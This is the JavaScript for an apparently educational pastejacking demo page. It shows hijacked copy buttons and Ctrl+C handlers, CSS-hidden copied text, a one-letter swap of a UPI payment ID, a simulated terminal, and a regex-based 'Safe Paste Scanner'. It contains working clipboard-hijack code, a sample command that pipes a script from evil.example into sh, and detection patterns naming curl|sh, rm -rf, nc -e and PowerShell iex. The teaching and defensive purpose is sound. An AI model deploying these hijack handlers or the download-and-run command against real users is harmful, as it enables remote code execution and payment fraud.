// script.js — the LOGIC of the Pastejacking Demo
// Pastejacking = a website (or malware) secretly changes what goes into your clipboard.
// Demos:
//   1) the copy button / Ctrl+C is hijacked by JavaScript
//   2) invisible text (hidden with CSS) is copied along with the selection
//   3) a UPI ID is swapped for the attacker's ID (what clipboard-hijacker malware does)
// Then: the paste box reveals the truth, a fake terminal shows what WOULD happen,
// and the Safe Paste Scanner checks any command for danger.
// SAFE: evil.example is a reserved fake domain; nothing on this page ever runs a command.

const SHOWN   = "pip install requests";
const SECRET  = "pip install requests && curl -s http://evil.example/steal.sh | sh";
const UPI_REAL = "ramstore@okbank";
const UPI_FAKE = "ramstore@okbanc";        // one letter changed: very hard to notice

/* ---------- helper: write text to the clipboard (with an old-browser fallback) ---------- */
async function writeClipboard(text) {
  try { await navigator.clipboard.writeText(text); }
  catch (e) {
    const t = document.createElement("textarea");
    t.value = text; document.body.appendChild(t); t.select();
    document.execCommand("copy"); t.remove();
  }
}

/* ---------- Demo 1: hijacked copy button + Ctrl+C ---------- */
document.getElementById("copy1").addEventListener("click", async function () {
  await writeClipboard(SECRET);                   // the button copies the SECRET, not what you see
  this.textContent = "✅ Copied! Now paste below";
});
document.getElementById("code1").addEventListener("copy", function (e) {
  e.preventDefault();                             // cancel the normal copy
  e.clipboardData.setData("text/plain", SECRET);  // and put the secret text in instead
});

/* ---------- Demo 2 needs no JavaScript: the hidden <span> is copied with the selection ---------- */

/* ---------- Demo 3: swapped UPI ID ---------- */
document.getElementById("copy3").addEventListener("click", async function () {
  await writeClipboard(UPI_FAKE);
  this.textContent = "✅ Copied! Now paste below";
});
document.getElementById("code3").addEventListener("copy", function (e) {
  e.preventDefault();
  e.clipboardData.setData("text/plain", UPI_FAKE);
});

/* ---------- Paste box: reveal what was REALLY copied ---------- */
const DANGER = /curl|wget|\|\s*(sudo\s+)?(ba)?sh|&&|;|rm\s+-rf|powershell|iex/i;
document.getElementById("paste").addEventListener("input", function () {
  const pasted = this.value.trim();
  const box = document.getElementById("verdict");
  const term = document.getElementById("terminal");
  term.hidden = true;
  if (!pasted) { box.className = ""; box.textContent = ""; return; }

  if (pasted === UPI_FAKE) {                      // Demo 3 result
    box.className = "bad";
    box.innerHTML = "<h3>🚨 Your UPI ID was swapped!</h3><p>You copied <b></b> but pasted <b></b>. One letter is different, so your money would go to the attacker.</p><p>Always read the name the UPI app shows before you pay.</p>";
    const b = box.querySelectorAll("b"); b[0].textContent = UPI_REAL; b[1].textContent = UPI_FAKE; // textContent = XSS-safe
    return;
  }
  if (pasted === UPI_REAL || pasted === SHOWN || pasted === "git clone https://github.com/Kanak234/demo && cd demo") {
    box.className = "ok"; box.textContent = "✅ What you pasted matches what you saw.";
    return;
  }
  if (DANGER.test(pasted)) {                      // Demo 1 / Demo 2 result
    box.className = "bad";
    box.innerHTML = "<h3>🚨 You got pastejacked!</h3><p>You saw a simple command, but you pasted:</p><pre></pre>";
    box.querySelector("pre").textContent = pasted;
    playTerminal(pasted);
    return;
  }
  box.className = ""; box.textContent = "Pasted text looks normal.";
});

/* ---------- Fake terminal: types out what WOULD happen (just an animation) ---------- */
let timer = null;
function playTerminal(cmd) {
  const term = document.getElementById("terminal");
  term.hidden = false;
  const lines = [
    ["t-grn", "$ " + cmd],
    ["t-dim", "Collecting requests ... done"],
    ["t-red", "Downloading http://evil.example/steal.sh"],
    ["t-red", "> reading browser saved passwords ...      (simulated)"],
    ["t-red", "> copying ~/.ssh keys and wallet files ...  (simulated)"],
    ["t-red", "> sending to attacker server ...            (simulated)"],
    ["t-grn", "✔ This was only an animation. In a real terminal, pressing Enter would have done this in seconds."]
  ];
  clearInterval(timer);
  term.textContent = "";
  let i = 0;
  timer = setInterval(() => {                     // one new line every 0.6 s
    if (i >= lines.length) { clearInterval(timer); const c = document.createElement("span"); c.className = "cursor"; term.appendChild(c); return; }
    const span = document.createElement("span");
    span.className = lines[i][0];
    span.textContent = lines[i][1] + "\n";
    term.appendChild(span);
    i++;
  }, 600);
}

/* ---------- Safe Paste Scanner ---------- */
// Each check: a pattern + what it means. Hidden characters are checked first.
const CHECKS = [
  { re: /[​-‍⁠﻿]/, msg: "Invisible (zero-width) characters are hidden inside." },
  { re: /\r|\n/, msg: "It contains a line break: the command would run the moment you paste it." },
  { re: /(curl|wget)[^|]*\|\s*(sudo\s+)?(ba|z)?sh\b/i, msg: "Downloads a script and runs it immediately (curl | sh)." },
  { re: /\brm\s+-rf?\b/i, msg: "Deletes files (rm -rf)." },
  { re: /base64\s+(-d|--decode)|frombase64string/i, msg: "Decodes hidden base64 text: a common way to hide what really runs." },
  { re: /powershell[^\n]*(-enc|-e\s|iex|invoke-expression)/i, msg: "PowerShell running hidden or downloaded code." },
  { re: /\bsudo\b/i, msg: "Asks for administrator (sudo) rights." },
  { re: /(&&|;|\|\|)/, msg: "Chains several commands together: read every part." },
  { re: /https?:\/\/(\d{1,3}\.){3}\d{1,3}/, msg: "Talks to a raw IP address instead of a named website." },
  { re: /chmod\s+\+x|>\s*\/dev\/|mkfifo|nc\s+-e/i, msg: "Makes files executable or opens a network shell." }
];
document.getElementById("scanBtn").addEventListener("click", function () {
  const text = document.getElementById("scanIn").value;
  const out = document.getElementById("scanOut");
  if (!text.trim()) { out.innerHTML = '<p class="muted">Paste a command first 🙂</p>'; return; }
  const found = CHECKS.filter(c => c.re.test(text));
  if (!found.length) {
    out.innerHTML = '<div class="alert good"><h3>✅ No dangerous patterns found</h3><p>Still read it once before you press Enter.</p></div>';
    return;
  }
  const level = found.length >= 2 ? "bad" : "warn";
  out.innerHTML = '<div class="alert ' + level + '"><h3>' + (level === "bad" ? "🚨 Dangerous command" : "⚠️ Be careful") +
    "</h3><p>" + found.length + " warning(s):</p></div><ul class=\"reasons finding\"></ul>";
  const ul = out.querySelector("ul");
  found.forEach(f => { const li = document.createElement("li"); li.textContent = f.msg; ul.appendChild(li); });
});
